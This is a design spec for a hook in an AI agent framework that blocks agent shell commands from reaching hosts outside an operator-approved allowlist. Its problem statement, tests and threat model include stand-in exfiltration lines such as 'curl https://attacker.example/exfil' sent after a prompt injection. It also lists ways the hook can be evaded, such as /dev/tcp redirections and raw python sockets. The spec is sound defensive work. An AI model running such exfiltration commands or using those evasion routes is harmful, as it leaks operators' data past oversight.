# Network egress allowlist (OSS Trust A-1) — spec

**Status**: ready for `/write-plan` after operator approval
**Parent**: `docs/specs/oss-trust-roadmap.md` Layer A item A-1 (parent spec is in PR #83 — not yet on `main` at the time of this spec's writing).
**Target release**: v0.5.0
**Depends on**: env-allowlist parser (P1-09 — in PR #69) for the new env vars. Both must merge before this spec implements.

## Problem

Today every shell command an agent invokes can reach any host on the internet. The approval-gate + bash-denylist hooks catch known DESTRUCTIVE patterns (`rm -rf /`, force-pushes, SQL DROP, …) but say nothing about `curl https://random-host.example/exfil`. A prompt-injection that bypasses the existing patterns + finds a novel exfil command has unconstrained network access.

The fix isn't more regex. The fix is a default-deny network gate: agents reach a documented set of operator-approved endpoints; everything else returns "blocked: not in egress allowlist".

## Non-goals

- Cross-application firewall replacement (`ufw` / `nftables`). Out of scope; operator runs whatever host firewall they want.
- Per-tool fine-grained allowlists. Single operator-global allowlist for v0.5.0; per-skill scoping is a v0.6.0 follow-up.
- Inbound traffic filtering. This spec is OUTBOUND only.
- Inspecting TLS payloads. The hook makes the allow/deny decision BEFORE the connection is opened (command-string parse → host extract → allowlist check). What crosses an allowed connection after that point is the operator's call. (Per D-2 below: the hook is hook-level / command-string parsing, NOT a connection-layer / kernel-netfilter intercept — that distinction is load-bearing for the threat model.)

## Decisions (proposed)

| # | Decision | Why |
|---|---|---|
| D-1 | **Allowlist lives at `~/.config/walter-os/egress-allowlist.txt`** (one host per line; lines starting with `#` are comments). | Same convention as `env-allowlist.txt` from P1-09. Operator-editable; no schema. |
| D-2 | **Enforcement via `hooks/network-gate.sh`** — a PreToolUse hook that inspects Bash tool calls for `curl`, `wget`, `git fetch`, `nc`, `ssh`, etc., and refuses if the target host isn't in the allowlist. **Threat model is explicit best-effort, not connection-layer**: this is command-string parsing of a known set of network CLIs, so it does NOT catch `python -c "import socket; ..."`, `node` raw HTTP, `openssl s_client`, `/dev/tcp` redirections, or any other unknown binary that opens a socket directly. Connection-layer enforcement (iptables / pfctl / systemd-nspawn netns / unshare) is a v0.5.x follow-up (A-3 process-isolation spec, PR #92) — that's where the deny-by-default network namespace lives. The hook is the cheap first-line defense against the 95% case of agent-invoked CLIs that DO include a host on the command line. | Hook-level enforcement keeps the gate inside Walter-OS's existing approval surface; no new daemon to manage. AC-2 documents the missing-host case (fail-CLOSED when the host can't be extracted from the command line). |
| D-3 | **Default-deny.** Allowlist starts empty after install; operator opts in to known-good hosts. | Sane secure floor. The `walter-os egress add <host>` subcommand makes it trivial to populate. |
| D-4 | **Bundled bootstrap allowlist** at `contexts/_examples/egress-allowlist.example.txt` lists the hosts Walter-OS itself talks to (`api.github.com`, `api.anthropic.com`, `pypi.org`, `registry.npmjs.org`, `objects.githubusercontent.com`, `raw.githubusercontent.com`, etc.). Operator copies it on first use. | Avoids first-day frustration; the operator chooses to copy it, so it's still an explicit decision. |
| D-5 | **Subdomain wildcard syntax**: single-label `*` (does NOT cross dots). `*.openrouter.ai` matches `api.openrouter.ai` and `auth.openrouter.ai`, but NOT `openrouter.ai` (no subdomain) and NOT `a.b.openrouter.ai` (two levels deep). Operator who wants multi-level adds an additional pattern as a SEPARATE LINE in `egress-allowlist.txt` (one host per line per D-1 — commas are NOT supported by the parser; the loader splits on newlines only). Concretely, to cover both `api.openrouter.ai` and `a.b.openrouter.ai`, the operator writes two lines: `*.openrouter.ai` and `*.*.openrouter.ai` (the latter is explicit two-level). This is NOT Python `fnmatch` (which lets `*` cross dots); the loader does the dot-counting check itself. | Operator-friendly + unambiguous. Multi-level wildcards in domain allowlists are a recurring source of over-broad rules; explicit per-level is safer. |
| D-6 | **Bypass requires `WALTER_EGRESS_ALLOW_OVERRIDE=1` + `--allow-egress-outbound` flag** — two-factor, same pattern as `bash-denylist`. | Single-factor bypasses get abused. |
| D-7 | **CLI: `walter-os egress {add,remove,list,test}`**. `test <host>` returns whether the host would be allowed without making a request. | Operator can audit + adjust without re-editing the file. |
| D-8 | **Independent PreToolUse hooks (no approval-gate coupling)**: network-gate runs as a separate hook in the PreToolUse chain. The chain semantics are "all hooks must allow" — approval-gate and network-gate compose by both being in the chain, NOT by approval-gate calling into network-gate. Either hook blocking → command blocked. This is the same composition pattern as `bash-denylist`. AC-6 below pins this composition. | Defense in depth without entangling two hooks' control flow. |

## Acceptance criteria

### AC-1 — Allowlist file + parser
- [ ] `~/.config/walter-os/egress-allowlist.txt` schema documented in `docs/operational/network-egress.md`:
  - One host per line (e.g. `api.github.com`)
  - `*.subdomain.example` wildcard
  - `# comments` allowed
  - Blank lines allowed
- [ ] `scripts/walter/lib/egress-loader.sh` exposes `walter_egress_host_allowed <host>` that returns 0 if the host matches an entry, 1 otherwise.
- [ ] `bats` coverage in `tests/walter/egress-loader.bats`:
  - Exact match: `api.github.com` matches the entry `api.github.com`
  - Wildcard: `api.openrouter.ai` matches `*.openrouter.ai`
  - No wildcard for root: `openrouter.ai` does NOT match `*.openrouter.ai`
  - Comment lines ignored
  - Missing file → all hosts denied (fail-closed default)

### AC-2 — `hooks/network-gate.sh` PreToolUse hook
- [ ] Hook reads PreToolUse JSON from stdin.
- [ ] Only inspects `Bash` tool calls (other tools pass through).
- [ ] Parses the command for known network-using commands: `curl`, `wget`, `git fetch/clone/push/pull`, `gh`, `nc`, `ssh`, `scp`, `rsync`, `pip`, `npm`, `uvx`, `cargo`.
- [ ] For each, extracts the target host (URL host, ssh user@host, git remote URL host).
- [ ] **Fail-CLOSED on missing host.** If the command matches a known network-using CLI but the target host CANNOT be extracted (e.g. `pip install requests` where the index URL comes from `~/.pip/pip.conf`; `npm install foo` where the registry defaults from `.npmrc`; `cargo build` where remote dependencies are in `Cargo.toml`), emit `{"decision":"block","reason":"network-gate: <cmd> uses an implicit host (config/env); explicitly pass --index-url / --registry / equivalent host argument, OR add the default host to the allowlist and re-run with WALTER_EGRESS_ALLOW_OVERRIDE=1 + --allow-egress-outbound"}`. This matches the default-deny posture in D-3.
- [ ] If host is NOT in the allowlist → emit `{"decision":"block","reason":"network-gate: <host> not in egress allowlist. Add via: walter-os egress add <host>"}`.
- [ ] If host IS in the allowlist → emit `{"decision":"allow"}`.
- [ ] Bypass: `WALTER_EGRESS_ALLOW_OVERRIDE=1` + `--allow-egress-outbound` in the command → allow with a `systemMessage` WARN.
- [ ] If command has no network operation OR doesn't match any known pattern → `{"decision":"allow"}` (this hook doesn't replace `bash-denylist`, it composes with it).
- [ ] bats coverage in `tests/hooks/network-gate.bats`:
  - `curl https://api.github.com` with `api.github.com` allowlisted → allow
  - `curl https://evil.example` with empty allowlist → block
  - `git clone git@github.com:foo/bar` with `github.com` allowlisted → allow
  - Two-factor bypass works
  - Non-Bash tool → passthrough allow

### AC-3 — CLI: `walter-os egress`
- [ ] `walter-os egress add <host>` appends the host to the allowlist (idempotent).
- [ ] `walter-os egress remove <host>` removes the line.
- [ ] `walter-os egress list` prints the current allowlist.
- [ ] `walter-os egress test <host>` returns `allowed` or `denied` per the loader; exit 0 / 1 mirrors.
- [ ] `walter-os egress import <path>` overwrites the allowlist with the contents of `<path>` (e.g. the bundled `egress-allowlist.example.txt`).
- [ ] bats coverage in `tests/cli/walter-os-egress.bats`.

### AC-4 — Bundled example
- [ ] `contexts/_examples/egress-allowlist.example.txt` ships with these defaults (one per line):
  ```
  # Walter-OS bootstrap allowlist — copy via: walter-os egress import \
  #   ${WALTER_OS_HOME}/contexts/_examples/egress-allowlist.example.txt
  
  # GitHub
  api.github.com
  github.com
  objects.githubusercontent.com
  raw.githubusercontent.com
  codeload.github.com
  
  # Package registries
  registry.npmjs.org
  pypi.org
  files.pythonhosted.org
  
  # LLM APIs (Walter-OS-supported)
  api.anthropic.com
  api.openai.com
  generativelanguage.googleapis.com
  openrouter.ai
  
  # Walter-OS infrastructure — see envsubst note below
  llm.${WALTER_DOMAIN}
  secrets.${WALTER_DOMAIN}
  
  # System time / OS package mirrors
  pool.ntp.org
  ```

  **Variable expansion**: `${WALTER_DOMAIN}` (and any other `${VAR}` reference) is expanded by `walter-os egress import` at import time via `envsubst`, NOT by the loader at match time. After import, the operator-on-disk allowlist contains the literal expanded hostnames (e.g. `llm.example.tld` rather than `llm.${WALTER_DOMAIN}`). If `WALTER_DOMAIN` is unset at import time, those two lines are silently skipped with a WARN — the operator has no operator-domain configured yet, so there's nothing to allow. The loader itself is variable-unaware (matches literal strings + the D-5 wildcards only). AC-3 below pins this behavior for `walter-os egress import`.

### AC-5 — Installer + audit integration
- [ ] `install.sh` adds a one-time prompt: "Walter-OS ships a default-deny egress allowlist. Import the bundled example? [Y/n]". On Y, runs `walter-os egress import "${WALTER_OS_HOME}/contexts/_examples/egress-allowlist.example.txt"` (absolute path derived from `WALTER_OS_HOME`, matching the rest of `install.sh`'s convention — relative cwd-dependent paths would break when `install.sh` is invoked from anywhere other than the repo root).
- [ ] **Hook registration**: `install.sh --upgrade` adds `hooks/network-gate.sh` to the `PreToolUse` Bash chain in `~/.claude/settings.json`. Order: after `bash-denylist.sh` and `approval-gate.sh` (so an RCE-pattern command is denied first; only commands that pass those gates get host-checked). Same wiring pattern as PR #100's bash-denylist/approval-gate restore. `tests/install/hook-chain-content.bats` extended to assert the new chain entry, so the registration cannot regress silently. Without this AC the hook ships but is INERT — operator-noticeable bug.
- [ ] `daily-supply-chain-audit` adds `check_egress_allowlist()`:
  - If the file doesn't exist → `info` finding (operator hasn't opted in yet — that's fine for the first day)
  - If the file is empty → `info` finding (every network call is blocked; probably misconfigured)
  - If a host in the allowlist resolves to a private IP (10.0.0.0/8, 192.168.0.0/16, etc.) → `high` finding (private-IP rebinding risk; document or remove)

### AC-6 — Approval-gate composition
- [ ] `hooks/approval-gate.sh` documents the relationship in its header comment: "approval-gate handles WHAT (destructive ops); network-gate handles WHERE (allowed hosts). Both must allow before a network operation proceeds."
- [ ] No actual logic change in approval-gate — the network-gate hook runs in parallel via the existing PreToolUse chain.

### AC-7 — Operator docs
- [ ] `docs/operational/network-egress.md` (new):
  - The default-deny philosophy
  - Allowlist file format + wildcard syntax
  - Common operator workflows (adding a new package mirror, allowing a one-off curl)
  - Audit-finding remediation steps
- [ ] CHANGELOG entry under `[Unreleased]` → `Added (default-deny security floor)`.

## Threat model

| Attack | Mitigation |
|---|---|
| Prompt-injection → `curl https://attacker.example/exfil` | `attacker.example` not in allowlist → blocked at PreToolUse |
| Allowlist config poisoning / path-override by a malicious file under `$WALTER_CONFIG` | The file is a flat text list (one host per line), NOT YAML — no parser-injection surface. The `egress-loader.sh` does string-match + dot-counting (per D-5), never `eval`. An attacker who can write `~/.config/walter-os/egress-allowlist.txt` can add hosts, but the file is operator-owned (`chmod 0600`) and the `daily-supply-chain-audit` snapshots its sha256 so any drift is reported on the next audit run. |
| Allowlist points at attacker-controlled mirror (e.g. operator pasted a typo'd hostname) | Daily audit checks if entries resolve to private IPs; operator-error mitigation. |
| Bypass via the two-factor escape | Requires `WALTER_EGRESS_ALLOW_OVERRIDE=1` (env, operator-set) AND `--allow-egress-outbound` in the command (operator types it). Both must be present. |
| Time-of-check / time-of-use (host resolution changes between gate and connection) | We pass the LITERAL host string, not a resolved IP. `curl` does its own resolution. We don't try to DNS-resolve in the gate. |

## Out of scope

- **Per-tool allowlists** (`heygen-cli` allowed only `api.heygen.com`). Future work; v0.5.0 stays operator-global.
- **Inspecting TLS payloads**. Connection layer only.
- **MITM / cert-pinning**. Operator's host CA bundle is authoritative.
- **Logging every blocked attempt to a separate egress-deny log**. Audit chain (Layer B of the OSS Trust roadmap) is the natural home; not v0.5.0.

## Recommended PR ordering

1. AC-1 — `egress-allowlist.txt` schema + `egress-loader.sh` lib + bats
2. AC-3 — `walter-os egress` CLI subcommand
3. AC-2 — `hooks/network-gate.sh` PreToolUse hook (uses AC-1 lib)
4. AC-4 — bundled `egress-allowlist.example.txt`
5. AC-5 — installer + audit integration
6. AC-6 — approval-gate doc update (small)
7. AC-7 — operator docs + CHANGELOG (closing PR)

## Open questions for the operator

1. **Default-deny on first install?** Proposal: yes, default-deny, but `install.sh` prompts to import the bundled example (AC-5). Alternative: install with the bundled example already imported. Trade-off: explicit vs frictionless.
2. **Wildcard depth**: D-5 picks single-label `*` (does NOT cross dots). `*.example.com` matches `api.example.com` only, NOT `a.b.example.com`. Multi-level requires an explicit second pattern. Should we instead allow `*` to cross dots? Proposal: no — explicit-per-level is the safer default for an allowlist. Operator can add `*.api.example.com` if they need two levels. Loader has dot-counting unit tests for `*.example.com` matching `api.example.com` (yes), `example.com` (no), and `a.b.example.com` (no).
3. **`walter-os egress test <host>` should also resolve DNS and report the IP?** Proposal: no — DNS resolution at test-time would teach the agent what the IP is, which has its own leak surface. Test stays string-only.

## Refs

- Parent: OSS Trust roadmap A-1 — umbrella in [PR #83](https://github.com/Xipher-Labs/walter-os/pull/83); post-merge in-tree path is `docs/specs/oss-trust-roadmap.md`.
- Pattern source: P1 hardening epic AC-6 (env-allowlist parser — same shape) — spec in [PR #94](https://github.com/Xipher-Labs/walter-os/pull/94); post-merge: `docs/specs/p1-hardening-epic.md`.
- `hooks/approval-gate.sh` + `hooks/bash-denylist.sh` (existing PreToolUse chain this composes with — already on main).
- `scripts/walter/lib/env-loader.sh` — P1-09 parser implementation. ALREADY on `main` (landed via [PR #69](https://github.com/Xipher-Labs/walter-os/pull/69) for v0.4.0); the egress-loader uses this as a template.
